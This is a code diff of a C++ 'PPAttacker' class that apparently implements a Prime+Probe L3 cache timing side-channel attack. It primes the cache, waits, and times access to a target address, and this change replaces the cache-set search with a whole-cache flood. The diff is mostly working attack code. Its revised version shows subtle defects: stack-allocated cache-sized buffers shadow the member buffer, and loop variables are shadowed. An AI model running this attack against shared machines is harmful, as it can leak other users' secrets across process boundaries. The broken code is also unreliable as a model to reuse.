@@ -70,17 +70,10 @@ PPAttacker::~PPAttacker() {
 }
 
 
-void PPAttacker::BombL3() {
-    for (int i = 0; i < L3Size; i += L3LineSize) {
-        buffer[i]++;
-    }
-}
-
-
 void PPAttacker::Attack() {
     // declaring variables
-    unsigned int measured, temp;
-    const int wordSize = 1;
+    unsigned int measured;
+    char buffer[L3Size];
 
     // logic
     // create a new measurements class
@@ -90,35 +83,17 @@ void PPAttacker::Attack() {
 
     // main attacking loop
     for (int i = 0; i < maxIterations; i++) {
-        // bomb column
-        for (int j = 0; j < L3Size; j += L3Size / L3Assoc) {
-            buffer[index + j]++;
+        // bomb L3
+        for (int i = 0; i < L3Size; i += L3LineSize) {
+            buffer[i]++;
         }
-        // sleep
+        // wait
         usleep(interval);
-
-        // read column
-        Measurements column = Measurements(inCacheTime, noCacheTime);
-        for (int j = 0; j < L3Size; j += L3Size / L3Assoc) {
-            column.AddMeasurement(time(NULL), MeasureTime(buffer + index + j));
-        }
-        column.UpdateSpeculations();
-        int sum = 0;
-        bool flag = false;
-        for (auto& access : column.GetAccessVector()) {
-            if (access.speculatedCache == Cache::L3)
-                sum += access.clockCycles;
-            else {
-                measurements.AddMeasurement(time(NULL), access.clockCycles);
-                flag = true;
-                break;
-            }
-        }
-        if (!flag) {
-            measurements.AddMeasurement(time(NULL), sum/L3Assoc);
-        }
+        // measure
+        measured = MeasureTime(targetPointer);
+        //if (measured < 100) cout << measured << endl;
+        measurements.AddMeasurement(time(NULL), measured);
     }
-
     measurements.UpdateSpeculations();
 }
 
@@ -168,7 +143,7 @@ void PPAttacker::Configure() {
     L3Assoc = stoi(GetAfterSpaces(Exec("getconf -a | grep LEVEL3_CACHE_ASSOC")));
 
     // allocate buffer
-    buffer = (char*)malloc(sizeof(char)*L3Size);
+    char buffer[L3Size];
 
     // try and find out in cache and not in cache times (without flushing)
     // set up pointer
@@ -176,7 +151,9 @@ void PPAttacker::Configure() {
     testingPointer = tester + L3LineSize*2;
     // measure
     for (i = 0; i < numOfIterations; i++) {
-        BombL3();
+        for (int i = 0; i < L3Size; i += L3LineSize) {
+            buffer[i]++;
+        }
         cyclesSum += MeasureTime(testingPointer);
     }
     SetNoCacheTime(cyclesSum / numOfIterations);
@@ -186,27 +163,15 @@ void PPAttacker::Configure() {
         cyclesSum += MeasureTime(testingPointer);
     }
     SetInCacheTime(cyclesSum / numOfIterations);
+
+    cout << "in time: " << inCacheTime << endl;
+    cout << "no time: " << noCacheTime << endl;
+
+    //cout << "---------" << endl << "Configuration:" << endl;
     //cout << "in time: " << inCacheTime << endl;
     //cout << "no time: " << noCacheTime << endl;
-
-    // find index
-    for (i = 0; i < L3Size/L3Assoc; i += L3LineSize) { // loop on cache columns
-        int counter = 0;
-        for (int iter = 0; iter < numOfIterations; iter++) {
-            //access targetPointer
-            MeasureTime(targetPointer);
-            // bomb column
-            for (int j = 0; j < L3Size; j += L3Size / L3Assoc) {
-                buffer[i + j]++;
-            }
-            // wait and measure
-            usleep(interval);
-            if (MeasureTime(targetPointer) > (noCacheTime + inCacheTime) / 2)
-                counter++;
-        }
-        if (counter > numOfIterations/2) {
-            index = i;
-            break;
-        }
-    }
+    //cout << "L3 size: " << L3Size      << endl;
+    //cout << "L3 line: " << L3LineSize  << endl;
+    //cout << "L3 asso: " << L3Assoc     << endl;
+    //cout << "---------" << endl;
 }
